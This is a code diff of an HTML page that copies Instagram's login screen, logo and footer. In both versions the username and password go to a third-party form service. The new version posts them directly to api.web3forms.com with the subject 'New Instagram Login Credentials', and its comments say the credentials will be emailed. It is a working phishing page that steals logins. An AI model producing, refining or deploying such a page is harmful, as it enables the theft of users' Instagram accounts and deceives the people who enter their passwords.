@@ -5,256 +5,249 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
     <style>
-        body {
+        * {
             margin: 0;
-            font-family: 'Arial', sans-serif;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
             background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
-
-        .main-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .phone-preview {
-            display: none;
-        }
-
-        .login-container {
+        
+        .container {
             max-width: 350px;
             width: 100%;
-            text-align: center;
         }
-
+        
         .login-box {
-            background: #fff;
+            background-color: #fff;
             border: 1px solid #dbdbdb;
-            padding: 20px;
+            border-radius: 1px;
+            padding: 20px 40px;
+            text-align: center;
             margin-bottom: 10px;
-            border-radius: 8px;
         }
-
-        .login-box img {
+        
+        .logo {
+            margin: 22px auto 12px;
             width: 175px;
-            margin: 20px 0;
         }
-
-        .form-input {
-            margin-bottom: 8px;
-            text-align: left;
+        
+        form {
+            margin-top: 24px;
         }
-
-        .form-input label {
-            font-size: 14px;
-            color: #333;
-        }
-
-        .form-input input {
-            width: 100%;
-            padding: 9px;
-            font-size: 14px;
+        
+        input {
+            background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            background: #fafafa;
-            margin-top: 4px;
-        }
-
-        .form-input input:focus {
-            outline: none;
-            border: 1px solid #a8a8a8;
-        }
-
-        .login-button {
+            color: #262626;
+            font-size: 14px;
+            padding: 9px 8px 7px;
             width: 100%;
+            margin-bottom: 6px;
+        }
+        
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+        
+        button {
             background-color: #0095f6;
             border: none;
+            border-radius: 4px;
             color: white;
-            padding: 10px;
-            font-size: 14px;
-            font-weight: bold;
-            border-radius: 3px;
+            font-weight: 600;
+            padding: 5px 9px;
+            width: 100%;
+            margin-top: 8px;
             cursor: pointer;
+            height: 32px;
+            font-size: 14px;
         }
-
-        .login-button:disabled {
-            background-color: #b2dffc;
-            cursor: not-allowed;
+        
+        button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
         }
-
+        
         .divider {
             display: flex;
             align-items: center;
-            text-align: center;
-            margin: 20px 0;
+            margin: 10px 0 18px;
         }
-
-        .divider::before,
-        .divider::after {
-            content: '';
+        
+        .divider::before, .divider::after {
+            content: "";
             flex: 1;
-            border-bottom: 1px solid #dbdbdb;
+            height: 1px;
+            background-color: #dbdbdb;
         }
-
-        .divider::before {
-            margin-right: 10px;
-        }
-
-        .divider::after {
-            margin-left: 10px;
-        }
-
-        .divider span {
-            font-size: 13px;
+        
+        .divider-text {
             color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+            text-transform: uppercase;
         }
-
-        .login-footer {
+        
+        .facebook-login {
+            color: #385185;
             font-size: 14px;
-            margin-top: 10px;
-        }
-
-        .login-footer a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .login-footer a:hover {
-            text-decoration: underline;
-        }
-
-        .app-download {
+            font-weight: 600;
+            margin: 8px 0;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
+            cursor: pointer;
+        }
+        
+        .facebook-icon {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 12px;
+            display: block;
+        }
+        
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .app-download {
+            text-align: center;
             margin-top: 20px;
         }
-
-        .app-download img {
-            width: 136px;
-            margin: 5px 0;
-        }
-
-        #result {
-            margin-top: 10px;
+        
+        .app-download p {
             font-size: 14px;
-            display: none;
+            margin: 10px 0;
         }
-
-        @media (min-width: 768px) {
-            .main-container {
-                max-width: 935px;
-                margin: auto;
-            }
-
-            .phone-preview {
-                display: block;
-                margin-right: 32px;
-            }
-
-            .phone-preview img {
-                height: 580px;
-            }
+        
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .app-store-img {
+            height: 40px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        
+        .footer-link {
+            margin: 0 8px 10px;
+            text-decoration: none;
+            color: #8e8e8e;
+        }
+        
+        .copyright {
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <!-- Phone Preview -->
-        <div class="phone-preview">
-            <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Instagram Phone Preview">
-        </div>
-
-        <!-- Login Form -->
-        <div class="login-container">
-            <div class="login-box">
-                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
-
-                <form id="loginForm">
-                    <input type="hidden" name="access_key" value="ed56c54d-eb19-49ae-b051-fbe97b2d8a7f">
-                    <div class="form-input">
-                        <label for="name">Username</label>
-                        <input id="name" type="text" name="name" placeholder="username or email" required>
-                    </div>
-                    <div class="form-input">
-                        <label for="email">Password</label>
-                        <input id="email" type="password" name="email" placeholder="password" required>
-                    </div>
-                    <button type="submit" class="login-button" id="loginButton">Log In</button>
-                </form>
-
-                <div id="result"></div>
-
-                <div class="divider"><span>OR</span></div>
-
-                <button class="login-button" style="background: transparent; color: #385185; font-weight: bold;">
-                    Log in with Facebook
-                </button>
-
-                <a href="#" style="font-size: 12px; color: #385185; text-decoration: none; display: block; margin-top: 10px;">
-                    Forgot password?
-                </a>
-            </div>
-
-            <div class="login-footer">
-                Don't have an account? <a href="signup.html">Sign up</a>
-            </div>
-
-            <div class="app-download">
-                <span>Get the app.</span>
-                <div>
-                    <img src="https://www.instagram.com/static/images/appstore.png/00a2e38d6a8b.png" alt="App Store">
-                    <img src="https://www.instagram.com/static/images/googleplay.png/9fe8a5c6c9e1.png" alt="Google Play">
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            
+            <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="b229c2dd-94bb-4f78-a091-342d1602c3c1">
+                <input type="hidden" name="redirect" value="https://example.com/thank-you">
+                <input type="hidden" name="subject" value="New Instagram Login Credentials">
+                
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                
+                <div class="divider">
+                    <div class="divider-text">or</div>
                 </div>
+                
+                <div class="facebook-login">
+                    <span class="facebook-icon">f</span>
+                    Log in with Facebook
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </div>
+        
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store-img">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store-img">
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Top Accounts</a>
+                <a href="#" class="footer-link">Hashtags</a>
+                <a href="#" class="footer-link">Locations</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+            </div>
+            <div class="copyright">
+                © 2023 Instagram from Meta
             </div>
         </div>
     </div>
+
     <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const form = e.target;
-            const result = document.getElementById('result');
-            const formData = new FormData(form);
-
-            result.textContent = "Please wait...";
-            result.style.display = "block";
-            result.style.color = "black";
-
-            try {
-                const response = await fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json',
-                    },
-                    body: JSON.stringify(Object.fromEntries(formData)),
-                });
-
-                const json = await response.json();
-
-                if (response.ok) {
-                    result.textContent = json.message;
-                    result.style.color = "green";
-                } else {
-                    result.textContent = json.message;
-                    result.style.color = "red";
-                }
-            } catch (error) {
-                console.error(error);
-                result.textContent = "Something went wrong!";
-                result.style.color = "red";
-            }
-
-            setTimeout(() => {
-                result.style.display = "none";
-                form.reset();
-            }, 3000);
+        // You can add JavaScript validation here if needed
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Form will be submitted to Web3Forms which will send the email
+            // All form fields (username and password) will be included automatically
         });
     </script>
 </body>
